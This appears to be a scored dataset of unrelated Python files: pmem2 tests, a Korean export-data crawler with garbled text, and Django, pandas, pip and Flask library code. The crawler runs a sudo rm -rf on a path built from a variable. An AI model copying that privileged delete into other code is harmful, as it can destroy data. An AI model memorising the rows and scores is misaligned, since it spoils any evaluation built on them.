class PMEM2_PERSIST(t.Test):
    test_type = t.Medium
    available_granularity = None

    def run(self, ctx):
        filepath = ctx.create_holey_file(2 * t.MiB, 'testfile')
        ctx.exec('pmem2_persist_valgrind', self.test_case, filepath)


class TEST0(PMEM2_PERSIST):
    """"""persist continuous data in a range of pmem""""""
    test_case = ""test_persist_continuous_range""


class TEST1(PMEM2_PERSIST):
    """"""persist discontinuous data in a range of pmem""""""
    test_case = ""test_persist_discontinuous_range""


class TEST2(PMEM2_PERSIST):
    """"""persist part of discontinuous data in a range of pmem""""""
    test_case = ""test_persist_discontinuous_range_partially""

    def run(self, ctx):
        filepath = ctx.create_holey_file(16 * t.KiB, 'testfile')
        ctx.exec('pmem2_persist_valgrind', self.test_case, filepath)
        pmemecheck_log = os.path.join(
            os.getcwd(), 'pmem2_persist_valgrind', 'pmemcheck2.log')
        futils.tail(pmemecheck_log, 2)


class TEST3(PMEM2_PERSIST):
    """"""persist data in a range of the memory mapped by mmap()""""""
    test_case = ""test_persist_nonpmem_data"""
252	adjudicated	0	"import datetime, json, os, sys
from lib.crawling import Crawling
from lib.database import DB
from lib.telegram import TeleGram
from lib.make_data import Make_Data
from lib.settings import logger, make_folder, args_check, json_check, now, photo_path

def run(hscode_dict, crawling, db, tele, make):
    menus = ''
    menus += '#ìì¶ìë°ì´í° ' + now.strftime('#%Yë%mì%dì¼') + '\n'

    for title in hscode_dict:
        tag = '#ìì¶ìë°ì´í°' + ' ' + '#' + title + ' ' + now.strftime('#%Yë%mì%dì¼')    
        photo_name = photo_path + str(hscode_dict[title]) + '_' + str(now.year) + str(now.month) + str(now.day) + '.png'
        crawling_dict = crawling.get_search(hscode_dict[title])
        df, template, month = make.data_remodel(crawling_dict, hscode_dict[title], tag, db)
        make.make_photo(df, title, hscode_dict[title], photo_name, month)
        tele.send_photo(photo_name, template)
        db.insert_update_db(title, hscode_dict[title], crawling_dict)
        menus += '#' + title + '\n'
    tele.send_message(menus)

def main():
    crawling = Crawling()
    db = DB()
    tele = TeleGram()
    make = Make_Data()

    for json_file in json_list:
        with open(json_path + json_file, 'r', encoding='utf-8') as f:
            hscode_dict = json.load(f)
        run(hscode_dict, crawling, db, tele, make)
        f.close()    

    db.cs.close()
    crawling.driver.close()

if __name__ == '__main__':
    args = sys.argv
    json_path = args_check(args)
    json_list = json_check(json_path)

    logger(f""Main started at {now}"")
    make_folder()
    main()
    et = datetime.datetime.now()
    logger(f""Main finished at {et}"")
    logger(f""Main time for task: {et-now}"")
    os.system(""sudo rm -rf {photo_path}*.png"".format(photo_path=photo_path))"
343	adjudicated	4	"""""""
PostGIS to GDAL conversion constant definitions
""""""
# Lookup to convert pixel type values from GDAL to PostGIS
GDAL_TO_POSTGIS = [None, 4, 6, 5, 8, 7, 10, 11, None, None, None, None]

# Lookup to convert pixel type values from PostGIS to GDAL
POSTGIS_TO_GDAL = [1, 1, 1, 3, 1, 3, 2, 5, 4, None, 6, 7, None, None]

# Struct pack structure for raster header, the raster header has the
# following structure:
#
# Endianness, PostGIS raster version, number of bands, scale, origin,
# skew, srid, width, and height.
#
# Scale, origin, and skew have x and y values. PostGIS currently uses
# a fixed endianness (1) and there is only one version (0).
POSTGIS_HEADER_STRUCTURE = 'B H H d d d d d d i H H'

# Lookup values to convert GDAL pixel types to struct characters. This is
# used to pack and unpack the pixel values of PostGIS raster bands.
GDAL_TO_STRUCT = [
    None, 'B', 'H', 'h', 'L', 'l', 'f', 'd',
    None, None, None, None,
]

# Size of the packed value in bytes for different numerical types.
# This is needed to cut chunks of band data out of PostGIS raster strings
# when decomposing them into GDALRasters.
# See https://docs.python.org/library/struct.html#format-characters
STRUCT_SIZE = {
    'b': 1,  # Signed char
    'B': 1,  # Unsigned char
    '?': 1,  # _Bool
    'h': 2,  # Short
    'H': 2,  # Unsigned short
    'i': 4,  # Integer
    'I': 4,  # Unsigned Integer
    'l': 4,  # Long
    'L': 4,  # Unsigned Long
    'f': 4,  # Float
    'd': 8,  # Double
}

# Pixel type specifies type of pixel values in a band. Storage flag specifies
# whether the band data is stored as part of the datum or is to be found on the
# server's filesystem. There are currently 11 supported pixel value types, so 4
# bits are enough to account for all. Reserve the upper 4 bits for generic
# flags.
# See https://trac.osgeo.org/postgis/wiki/WKTRaster/RFC/RFC1_V0SerialFormat#Pixeltypeandstorageflag
BANDTYPE_PIXTYPE_MASK = 0x0F
BANDTYPE_FLAG_HASNODATA = 1 << 6"
192	adjudicated	1	"import functools
from typing import Callable, Generator, Iterable, Iterator, Optional, Tuple

from pip._vendor.rich.progress import (
    BarColumn,
    DownloadColumn,
    FileSizeColumn,
    Progress,
    ProgressColumn,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
    TimeRemainingColumn,
    TransferSpeedColumn,
)

from pip._internal.utils.logging import get_indentation

DownloadProgressRenderer = Callable[[Iterable[bytes]], Iterator[bytes]]


def _rich_progress_bar(
    iterable: Iterable[bytes],
    *,
    bar_type: str,
    size: int,
) -> Generator[bytes, None, None]:
    assert bar_type == ""on"", ""This should only be used in the default mode.""

    if not size:
        total = float(""inf"")
        columns: Tuple[ProgressColumn, ...] = (
            TextColumn(""[progress.description]{task.description}""),
            SpinnerColumn(""line"", speed=1.5),
            FileSizeColumn(),
            TransferSpeedColumn(),
            TimeElapsedColumn(),
        )
    else:
        total = size
        columns = (
            TextColumn(""[progress.description]{task.description}""),
            BarColumn(),
            DownloadColumn(),
            TransferSpeedColumn(),
            TextColumn(""eta""),
            TimeRemainingColumn(),
        )

    progress = Progress(*columns, refresh_per_second=30)
    task_id = progress.add_task("" "" * (get_indentation() + 2), total=total)
    with progress:
        for chunk in iterable:
            yield chunk
            progress.update(task_id, advance=len(chunk))


def get_download_progress_renderer(
    *, bar_type: str, size: Optional[int] = None
) -> DownloadProgressRenderer:
    """"""Get an object that can be used to render the download progress.

    Returns a callable, that takes an iterable to ""wrap"".
    """"""
    if bar_type == ""on"":
        return functools.partial(_rich_progress_bar, bar_type=bar_type, size=size)
    else:
        return iter  # no-op, when passed an iterator"
203	adjudicated	3	"from importlib import import_module

from django.utils.version import get_docs_version


def deconstructible(*args, path=None):
    """"""
    Class decorator that allows the decorated class to be serialized
    by the migrations subsystem.

    The `path` kwarg specifies the import path.
    """"""

    def decorator(klass):
        def __new__(cls, *args, **kwargs):
            # We capture the arguments to make returning them trivial
            obj = super(klass, cls).__new__(cls)
            obj._constructor_args = (args, kwargs)
            return obj

        def deconstruct(obj):
            """"""
            Return a 3-tuple of class import path, positional arguments,
            and keyword arguments.
            """"""
            # Fallback version
            if path and type(obj) is klass:
                module_name, _, name = path.rpartition(""."")
            else:
                module_name = obj.__module__
                name = obj.__class__.__name__
            # Make sure it's actually there and not an inner class
            module = import_module(module_name)
            if not hasattr(module, name):
                raise ValueError(
                    ""Could not find object %s in %s.\n""
                    ""Please note that you cannot serialize things like inner ""
                    ""classes. Please move the object into the main module ""
                    ""body to use migrations.\n""
                    ""For more information, see ""
                    ""https://docs.djangoproject.com/en/%s/topics/migrations/""
                    ""#serializing-values"" % (name, module_name, get_docs_version())
                )
            return (
                path
                if path and type(obj) is klass
                else f""{obj.__class__.__module__}.{name}"",
                obj._constructor_args[0],
                obj._constructor_args[1],
            )

        klass.__new__ = staticmethod(__new__)
        klass.deconstruct = deconstruct

        return klass

    if not args:
        return decorator
    return decorator(*args)"
21	adjudicated	1	"# Levels
DEBUG = 10
INFO = 20
WARNING = 30
ERROR = 40
CRITICAL = 50


class CheckMessage:

    def __init__(self, level, msg, hint=None, obj=None, id=None):
        assert isinstance(level, int), ""The first argument should be level.""
        self.level = level
        self.msg = msg
        self.hint = hint
        self.obj = obj
        self.id = id

    def __eq__(self, other):
        return (
            isinstance(other, self.__class__) and
            all(getattr(self, attr) == getattr(other, attr)
                for attr in ['level', 'msg', 'hint', 'obj', 'id'])
        )

    def __str__(self):
        from django.db import models

        if self.obj is None:
            obj = ""?""
        elif isinstance(self.obj, models.base.ModelBase):
            # We need to hardcode ModelBase and Field cases because its __str__
            # method doesn't return ""applabel.modellabel"" and cannot be changed.
            obj = self.obj._meta.label
        else:
            obj = str(self.obj)
        id = ""(%s) "" % self.id if self.id else """"
        hint = ""\n\tHINT: %s"" % self.hint if self.hint else ''
        return ""%s: %s%s%s"" % (obj, id, self.msg, hint)

    def __repr__(self):
        return ""<%s: level=%r, msg=%r, hint=%r, obj=%r, id=%r>"" % \
            (self.__class__.__name__, self.level, self.msg, self.hint, self.obj, self.id)

    def is_serious(self, level=ERROR):
        return self.level >= level

    def is_silenced(self):
        from django.conf import settings
        return self.id in settings.SILENCED_SYSTEM_CHECKS


class Debug(CheckMessage):
    def __init__(self, *args, **kwargs):
        super().__init__(DEBUG, *args, **kwargs)


class Info(CheckMessage):
    def __init__(self, *args, **kwargs):
        super().__init__(INFO, *args, **kwargs)


class Warning(CheckMessage):
    def __init__(self, *args, **kwargs):
        super().__init__(WARNING, *args, **kwargs)


class Error(CheckMessage):
    def __init__(self, *args, **kwargs):
        super().__init__(ERROR, *args, **kwargs)


class Critical(CheckMessage):
    def __init__(self, *args, **kwargs):
        super().__init__(CRITICAL, *args, **kwargs)"
161	adjudicated	0	"from django.contrib.messages.views import SuccessMessageMixin
from django.urls import reverse_lazy
from django.views.generic import ListView
from django.views.generic.edit import CreateView, UpdateView, DeleteView
from .forms import FlatForm
from .mixins import HousesAddMixin, SeveralInstanceCreateMixin
from .models import Flat
from django.utils.translation import gettext_lazy as _

from ..mixins import LoginRequiredMixinCustom


class FlatCreateView(LoginRequiredMixinCustom, SeveralInstanceCreateMixin,
                     SuccessMessageMixin, CreateView):
    form_class = FlatForm
    template_name = ""flat/create.html""
    success_url = reverse_lazy('flat_list')
    login_url = reverse_lazy(""user_login"")
    extra_context = {
        'header': _('Create flat'),
        'button_title': _('Create'),
    }
    success_message = _('Flat created successfully')


class FlatListView(LoginRequiredMixinCustom, HousesAddMixin, ListView):
    model = Flat
    template_name = ""flat/list.html""
    extra_context = {
        ""remove_title"": _(""remove"")
    }


class FlatUpdateView(LoginRequiredMixinCustom,
                     SuccessMessageMixin, UpdateView):
    model = Flat
    form_class = FlatForm
    template_name = ""flat/create.html""
    success_url = reverse_lazy('flat_list')
    extra_context = {
        'header': _('Update Flat'),
        'button_title': _('Update'),
    }
    success_message = _('Flat updated successfully')


class FlatDeleteView(LoginRequiredMixinCustom,
                     SuccessMessageMixin, DeleteView):
    model = Flat
    template_name = ""flat/delete.html""
    success_url = reverse_lazy('flat_list')
    extra_context = {
        'header': _('Remove flat'),
        'button_title': _('Remove '),
        'message': _('Are you sure delete flat '),
    }
    success_message = _('Flat deleted successfully')"
70	adjudicated	4	"""""""Simple function for embedding an IPython kernel
""""""
# -----------------------------------------------------------------------------
# Imports
# -----------------------------------------------------------------------------

import sys

from IPython.utils.frame import extract_module_locals

from .kernelapp import IPKernelApp

# -----------------------------------------------------------------------------
# Code
# -----------------------------------------------------------------------------


def embed_kernel(module=None, local_ns=None, **kwargs):
    """"""Embed and start an IPython kernel in a given scope.

    Parameters
    ----------
    module : ModuleType, optional
        The module to load into IPython globals (default: caller)
    local_ns : dict, optional
        The namespace to load into IPython user namespace (default: caller)
    **kwargs : various, optional
        Further keyword args are relayed to the IPKernelApp constructor,
        allowing configuration of the Kernel.  Will only have an effect
        on the first embed_kernel call for a given process.

    """"""
    # get the app if it exists, or set it up if it doesn't
    if IPKernelApp.initialized():
        app = IPKernelApp.instance()
    else:
        app = IPKernelApp.instance(**kwargs)
        app.initialize([])
        # Undo unnecessary sys module mangling from init_sys_modules.
        # This would not be necessary if we could prevent it
        # in the first place by using a different InteractiveShell
        # subclass, as in the regular embed case.
        main = app.kernel.shell._orig_sys_modules_main_mod
        if main is not None:
            sys.modules[app.kernel.shell._orig_sys_modules_main_name] = main

    # load the calling scope if not given
    (caller_module, caller_locals) = extract_module_locals(1)
    if module is None:
        module = caller_module
    if local_ns is None:
        local_ns = caller_locals

    app.kernel.user_module = module
    app.kernel.user_ns = local_ns
    app.shell.set_completer_frame()
    app.start()"
130	adjudicated	4	"""""""
Given a list of integers, made up of (hopefully) a small number of long runs
of consecutive integers, compute a representation of the form
((start1, end1), (start2, end2) ...). Then answer the question ""was x present
in the original list?"" in time O(log(# runs)).
""""""

import bisect
from typing import List, Tuple

def intranges_from_list(list_: List[int]) -> Tuple[int, ...]:
    """"""Represent a list of integers as a sequence of ranges:
    ((start_0, end_0), (start_1, end_1), ...), such that the original
    integers are exactly those x such that start_i <= x < end_i for some i.

    Ranges are encoded as single integers (start << 32 | end), not as tuples.
    """"""

    sorted_list = sorted(list_)
    ranges = []
    last_write = -1
    for i in range(len(sorted_list)):
        if i+1 < len(sorted_list):
            if sorted_list[i] == sorted_list[i+1]-1:
                continue
        current_range = sorted_list[last_write+1:i+1]
        ranges.append(_encode_range(current_range[0], current_range[-1] + 1))
        last_write = i

    return tuple(ranges)

def _encode_range(start: int, end: int) -> int:
    return (start << 32) | end

def _decode_range(r: int) -> Tuple[int, int]:
    return (r >> 32), (r & ((1 << 32) - 1))


def intranges_contain(int_: int, ranges: Tuple[int, ...]) -> bool:
    """"""Determine if `int_` falls into one of the ranges in `ranges`.""""""
    tuple_ = _encode_range(int_, 0)
    pos = bisect.bisect_left(ranges, tuple_)
    # we could be immediately ahead of a tuple (start, end)
    # with start < int_ <= end
    if pos > 0:
        left, right = _decode_range(ranges[pos-1])
        if left <= int_ < right:
            return True
    # or we could be immediately behind a tuple (int_, end)
    if pos < len(ranges):
        left, _ = _decode_range(ranges[pos])
        if left == int_:
            return True
    return False"
50	adjudicated	3	"# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License. See LICENSE in the project root
# for license information.

import contextlib
import os


@contextlib.contextmanager
def cwd(dirname):
    """"""A context manager for operating in a different directory.""""""
    orig = os.getcwd()
    os.chdir(dirname)
    try:
        yield orig
    finally:
        os.chdir(orig)


def iter_all_files(root, prune_dir=None, exclude_file=None):
    """"""Yield (dirname, basename, filename) for each file in the tree.

    This is an alternative to os.walk() that flattens out the tree and
    with filtering.
    """"""
    pending = [root]
    while pending:
        dirname = pending.pop(0)
        for result in _iter_files(dirname, pending, prune_dir, exclude_file):
            yield result


def iter_tree(root, prune_dir=None, exclude_file=None):
    """"""Yield (dirname, files) for each directory in the tree.

    The list of files is actually a list of (basename, filename).

    This is an alternative to os.walk() with filtering.""""""
    pending = [root]
    while pending:
        dirname = pending.pop(0)
        files = []
        for _, b, f in _iter_files(dirname, pending, prune_dir, exclude_file):
            files.append((b, f))
        yield dirname, files


def _iter_files(dirname, subdirs, prune_dir, exclude_file):
    for basename in os.listdir(dirname):
        filename = os.path.join(dirname, basename)
        if os.path.isdir(filename):
            if prune_dir is not None and prune_dir(dirname, basename):
                continue
            subdirs.append(filename)
        else:
            # TODO: Use os.path.isfile() to narrow it down?
            if exclude_file is not None and exclude_file(dirname, basename):
                continue
            yield dirname, basename, filename"
110	adjudicated	3	"import glob
from tempfile import gettempdir

import os

import errno

from cloudinary.cache.storage.key_value_storage import KeyValueStorage


class FileSystemKeyValueStorage(KeyValueStorage):
    """"""File-based key-value storage""""""
    _item_ext = "".cldci""

    def __init__(self, root_path):
        """"""
        Create a new Storage object.

        All files will be stored under the root_path location

        :param root_path: The base folder for all storage files
        """"""
        if root_path is None:
            root_path = gettempdir()

        if not os.path.isdir(root_path):
            os.makedirs(root_path)

        self._root_path = root_path

    def get(self, key):
        if not self._exists(key):
            return None

        with open(self._get_key_full_path(key), 'r') as f:
            value = f.read()

        return value

    def set(self, key, value):
        with open(self._get_key_full_path(key), 'w') as f:
            f.write(value)

        return True

    def delete(self, key):
        try:
            os.remove(self._get_key_full_path(key))
        except OSError as e:
            if e.errno != errno.ENOENT:  # errno.ENOENT - no such file or directory
                raise  # re-raise exception if a different error occurred

        return True

    def clear(self):
        for cache_item_path in glob.iglob(os.path.join(self._root_path, '*' + self._item_ext)):
            os.remove(cache_item_path)

        return True

    def _get_key_full_path(self, key):
        """"""
        Generate the file path for the key

        :param key: The key

        :return: The absolute path of the value file associated with the key
        """"""
        return os.path.join(self._root_path, key + self._item_ext)

    def _exists(self, key):
        """"""
        Indicate whether key exists

        :param key: The key

        :return: bool True if the file for the given key exists
        """"""
        return os.path.isfile(self._get_key_full_path(key))"
1	adjudicated	1	"from pandas import (
    DataFrame,
    Index,
    Series,
)
import pandas._testing as tm


class TestToFrame:
    def test_to_frame_respects_name_none(self):
        # GH#44212 if we explicitly pass name=None, then that should be respected,
        #  not changed to 0
        # GH-45448 this is first deprecated to only change in the future
        ser = Series(range(3))
        with tm.assert_produces_warning(FutureWarning):
            result = ser.to_frame(None)

        # exp_index = Index([None], dtype=object)
        exp_index = Index([0])
        tm.assert_index_equal(result.columns, exp_index)

        with tm.assert_produces_warning(FutureWarning):
            result = ser.rename(""foo"").to_frame(None)
        exp_index = Index([""foo""], dtype=object)
        tm.assert_index_equal(result.columns, exp_index)

    def test_to_frame(self, datetime_series):
        datetime_series.name = None
        rs = datetime_series.to_frame()
        xp = DataFrame(datetime_series.values, index=datetime_series.index)
        tm.assert_frame_equal(rs, xp)

        datetime_series.name = ""testname""
        rs = datetime_series.to_frame()
        xp = DataFrame(
            {""testname"": datetime_series.values}, index=datetime_series.index
        )
        tm.assert_frame_equal(rs, xp)

        rs = datetime_series.to_frame(name=""testdifferent"")
        xp = DataFrame(
            {""testdifferent"": datetime_series.values}, index=datetime_series.index
        )
        tm.assert_frame_equal(rs, xp)

    def test_to_frame_expanddim(self):
        # GH#9762

        class SubclassedSeries(Series):
            @property
            def _constructor_expanddim(self):
                return SubclassedFrame

        class SubclassedFrame(DataFrame):
            pass

        ser = SubclassedSeries([1, 2, 3], name=""X"")
        result = ser.to_frame()
        assert isinstance(result, SubclassedFrame)
        expected = SubclassedFrame({""X"": [1, 2, 3]})
        tm.assert_frame_equal(result, expected)"
390	adjudicated	0	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .chardistribution import EUCKRDistributionAnalysis
from .codingstatemachine import CodingStateMachine
from .mbcharsetprober import MultiByteCharSetProber
from .mbcssm import EUCKR_SM_MODEL


class EUCKRProber(MultiByteCharSetProber):
    def __init__(self) -> None:
        super().__init__()
        self.coding_sm = CodingStateMachine(EUCKR_SM_MODEL)
        self.distribution_analyzer = EUCKRDistributionAnalysis()
        self.reset()

    @property
    def charset_name(self) -> str:
        return ""EUC-KR""

    @property
    def language(self) -> str:
        return ""Korean"""
141	adjudicated	3	"import typing as t

try:
    from blinker import Namespace

    signals_available = True
except ImportError:
    signals_available = False

    class Namespace:  # type: ignore
        def signal(self, name: str, doc: t.Optional[str] = None) -> ""_FakeSignal"":
            return _FakeSignal(name, doc)

    class _FakeSignal:
        """"""If blinker is unavailable, create a fake class with the same
        interface that allows sending of signals but will fail with an
        error on anything else.  Instead of doing anything on send, it
        will just ignore the arguments and do nothing instead.
        """"""

        def __init__(self, name: str, doc: t.Optional[str] = None) -> None:
            self.name = name
            self.__doc__ = doc

        def send(self, *args: t.Any, **kwargs: t.Any) -> t.Any:
            pass

        def _fail(self, *args: t.Any, **kwargs: t.Any) -> t.Any:
            raise RuntimeError(
                ""Signalling support is unavailable because the blinker""
                "" library is not installed.""
            ) from None

        connect = connect_via = connected_to = temporarily_connected_to = _fail
        disconnect = _fail
        has_receivers_for = receivers_for = _fail
        del _fail


# The namespace for code signals.  If you are not Flask code, do
# not put signals in here.  Create your own namespace instead.
_signals = Namespace()


# Core signals.  For usage examples grep the source code or consult
# the API documentation in docs/api.rst as well as docs/signals.rst
template_rendered = _signals.signal(""template-rendered"")
before_render_template = _signals.signal(""before-render-template"")
request_started = _signals.signal(""request-started"")
request_finished = _signals.signal(""request-finished"")
request_tearing_down = _signals.signal(""request-tearing-down"")
got_request_exception = _signals.signal(""got-request-exception"")
appcontext_tearing_down = _signals.signal(""appcontext-tearing-down"")
appcontext_pushed = _signals.signal(""appcontext-pushed"")
appcontext_popped = _signals.signal(""appcontext-popped"")
message_flashed = _signals.signal(""message-flashed"")"
363	adjudicated	0	"import esphome.codegen as cg
import esphome.config_validation as cv
from esphome.components import switch
from esphome.const import ICON_POWER
from .. import CONF_PIPSOLAR_ID, PIPSOLAR_COMPONENT_SCHEMA, pipsolar_ns

DEPENDENCIES = [""uart""]

CONF_OUTPUT_SOURCE_PRIORITY_UTILITY = ""output_source_priority_utility""
CONF_OUTPUT_SOURCE_PRIORITY_SOLAR = ""output_source_priority_solar""
CONF_OUTPUT_SOURCE_PRIORITY_BATTERY = ""output_source_priority_battery""
CONF_INPUT_VOLTAGE_RANGE = ""input_voltage_range""
CONF_PV_OK_CONDITION_FOR_PARALLEL = ""pv_ok_condition_for_parallel""
CONF_PV_POWER_BALANCE = ""pv_power_balance""

TYPES = {
    CONF_OUTPUT_SOURCE_PRIORITY_UTILITY: (""POP00"", None),
    CONF_OUTPUT_SOURCE_PRIORITY_SOLAR: (""POP01"", None),
    CONF_OUTPUT_SOURCE_PRIORITY_BATTERY: (""POP02"", None),
    CONF_INPUT_VOLTAGE_RANGE: (""PGR01"", ""PGR00""),
    CONF_PV_OK_CONDITION_FOR_PARALLEL: (""PPVOKC1"", ""PPVOKC0""),
    CONF_PV_POWER_BALANCE: (""PSPB1"", ""PSPB0""),
}

PipsolarSwitch = pipsolar_ns.class_(""PipsolarSwitch"", switch.Switch, cg.Component)

PIPSWITCH_SCHEMA = switch.switch_schema(
    PipsolarSwitch, icon=ICON_POWER, block_inverted=True
).extend(cv.COMPONENT_SCHEMA)

CONFIG_SCHEMA = PIPSOLAR_COMPONENT_SCHEMA.extend(
    {cv.Optional(type): PIPSWITCH_SCHEMA for type in TYPES}
)


async def to_code(config):
    paren = await cg.get_variable(config[CONF_PIPSOLAR_ID])

    for type, (on, off) in TYPES.items():
        if type in config:
            conf = config[type]
            var = await switch.new_switch(conf)
            await cg.register_component(var, conf)
            cg.add(getattr(paren, f""set_{type}_switch"")(var))
            cg.add(var.set_parent(paren))
            cg.add(var.set_on_command(on))
            if off is not None:
                cg.add(var.set_off_command(off))"
223	adjudicated	1	"# Copyright 2016 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os
import uuid

import pytest

from product_management import create_product, delete_product
from reference_image_management import (
    create_reference_image, delete_reference_image, list_reference_images)


PROJECT_ID = os.getenv('GOOGLE_CLOUD_PROJECT')
LOCATION = 'us-west1'

PRODUCT_DISPLAY_NAME = 'fake_product_display_name_for_testing'
PRODUCT_CATEGORY = 'homegoods'
PRODUCT_ID = 'test_{}'.format(uuid.uuid4())

REFERENCE_IMAGE_ID = 'fake_reference_image_id_for_testing'
GCS_URI = 'gs://cloud-samples-data/vision/product_search/shoes_1.jpg'


@pytest.fixture(scope=""function"", autouse=True)
def setup_teardown():
    # set up
    create_product(
        PROJECT_ID, LOCATION, PRODUCT_ID,
        PRODUCT_DISPLAY_NAME, PRODUCT_CATEGORY)

    yield None

    # tear down
    delete_product(PROJECT_ID, LOCATION, PRODUCT_ID)


def test_create_reference_image(capsys):
    create_reference_image(
        PROJECT_ID, LOCATION, PRODUCT_ID, REFERENCE_IMAGE_ID,
        GCS_URI)
    list_reference_images(PROJECT_ID, LOCATION, PRODUCT_ID)
    out, _ = capsys.readouterr()
    assert REFERENCE_IMAGE_ID in out


def test_delete_reference_image(capsys):
    create_reference_image(
        PROJECT_ID, LOCATION, PRODUCT_ID, REFERENCE_IMAGE_ID,
        GCS_URI)
    list_reference_images(PROJECT_ID, LOCATION, PRODUCT_ID)
    out, _ = capsys.readouterr()
    assert REFERENCE_IMAGE_ID in out

    delete_reference_image(
        PROJECT_ID, LOCATION, PRODUCT_ID, REFERENCE_IMAGE_ID)
    list_reference_images(PROJECT_ID, LOCATION, PRODUCT_ID)
    out, _ = capsys.readouterr()
    assert REFERENCE_IMAGE_ID not in out"
332	adjudicated	4	"from __future__ import annotations

import numpy as np

from pandas._typing import NumpyIndexT

from pandas.core.dtypes.common import is_list_like


def cartesian_product(X) -> list[np.ndarray]:
    """"""
    Numpy version of itertools.product.
    Sometimes faster (for large inputs)...

    Parameters
    ----------
    X : list-like of list-likes

    Returns
    -------
    product : list of ndarrays

    Examples
    --------
    >>> cartesian_product([list('ABC'), [1, 2]])
    [array(['A', 'A', 'B', 'B', 'C', 'C'], dtype='<U1'), array([1, 2, 1, 2, 1, 2])]

    See Also
    --------
    itertools.product : Cartesian product of input iterables.  Equivalent to
        nested for-loops.
    """"""
    msg = ""Input must be a list-like of list-likes""
    if not is_list_like(X):
        raise TypeError(msg)
    for x in X:
        if not is_list_like(x):
            raise TypeError(msg)

    if len(X) == 0:
        return []

    lenX = np.fromiter((len(x) for x in X), dtype=np.intp)
    cumprodX = np.cumproduct(lenX)

    if np.any(cumprodX < 0):
        raise ValueError(""Product space too large to allocate arrays!"")

    a = np.roll(cumprodX, 1)
    a[0] = 1

    if cumprodX[-1] != 0:
        b = cumprodX[-1] / cumprodX
    else:
        # if any factor is empty, the cartesian product is empty
        b = np.zeros_like(cumprodX)

    # error: Argument of type ""int_"" cannot be assigned to parameter ""num"" of
    # type ""int"" in function ""tile_compat""
    return [
        tile_compat(
            np.repeat(x, b[i]),
            np.product(a[i]),  # pyright: ignore[reportGeneralTypeIssues]
        )
        for i, x in enumerate(X)
    ]


def tile_compat(arr: NumpyIndexT, num: int) -> NumpyIndexT:
    """"""
    Index compat for np.tile.

    Notes
    -----
    Does not support multi-dimensional `num`.
    """"""
    if isinstance(arr, np.ndarray):
        return np.tile(arr, num)

    # Otherwise we have an Index
    taker = np.tile(np.arange(len(arr)), num)
    return arr.take(taker)"
272	adjudicated	3	"#!/usr/bin/env python
#
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
""""""Demo for receiving notifications.""""""


def receive_notifications(project_id, subscription_name):
    # [START securitycenter_receive_notifications]
    # Requires https://cloud.google.com/pubsub/docs/quickstart-client-libraries#pubsub-client-libraries-python
    import concurrent

    from google.cloud import pubsub_v1
    from google.cloud.securitycenter_v1 import NotificationMessage

    # TODO: project_id = ""your-project-id""
    # TODO: subscription_name = ""your-subscription-name""

    def callback(message):

        # Print the data received for debugging purpose if needed
        print(f""Received message: {message.data}"")

        notification_msg = NotificationMessage.from_json(message.data)

        print(
            ""Notification config name: {}"".format(
                notification_msg.notification_config_name
            )
        )
        print(""Finding: {}"".format(notification_msg.finding))

        # Ack the message to prevent it from being pulled again
        message.ack()

    subscriber = pubsub_v1.SubscriberClient()
    subscription_path = subscriber.subscription_path(project_id, subscription_name)

    streaming_pull_future = subscriber.subscribe(subscription_path, callback=callback)

    print(""Listening for messages on {}...\n"".format(subscription_path))
    try:
        streaming_pull_future.result(timeout=1)  # Block for 1 second
    except concurrent.futures.TimeoutError:
        streaming_pull_future.cancel()
    # [END securitycenter_receive_notifications]
    return True"
175	adjudicated	1	"""""""
Tests that work on both the Python and C engines but do not have a
specific classification into the other test modules.
""""""
import csv
from io import StringIO

import pytest

from pandas import DataFrame
import pandas._testing as tm

from pandas.io.parsers import TextParser

xfail_pyarrow = pytest.mark.usefixtures(""pyarrow_xfail"")


@xfail_pyarrow
def test_read_data_list(all_parsers):
    parser = all_parsers
    kwargs = {""index_col"": 0}
    data = ""A,B,C\nfoo,1,2,3\nbar,4,5,6""

    data_list = [[""A"", ""B"", ""C""], [""foo"", ""1"", ""2"", ""3""], [""bar"", ""4"", ""5"", ""6""]]
    expected = parser.read_csv(StringIO(data), **kwargs)

    with TextParser(data_list, chunksize=2, **kwargs) as parser:
        result = parser.read()

    tm.assert_frame_equal(result, expected)


def test_reader_list(all_parsers):
    data = """"""index,A,B,C,D
foo,2,3,4,5
bar,7,8,9,10
baz,12,13,14,15
qux,12,13,14,15
foo2,12,13,14,15
bar2,12,13,14,15
""""""
    parser = all_parsers
    kwargs = {""index_col"": 0}

    lines = list(csv.reader(StringIO(data)))
    with TextParser(lines, chunksize=2, **kwargs) as reader:
        chunks = list(reader)

    expected = parser.read_csv(StringIO(data), **kwargs)

    tm.assert_frame_equal(chunks[0], expected[:2])
    tm.assert_frame_equal(chunks[1], expected[2:4])
    tm.assert_frame_equal(chunks[2], expected[4:])


def test_reader_list_skiprows(all_parsers):
    data = """"""index,A,B,C,D
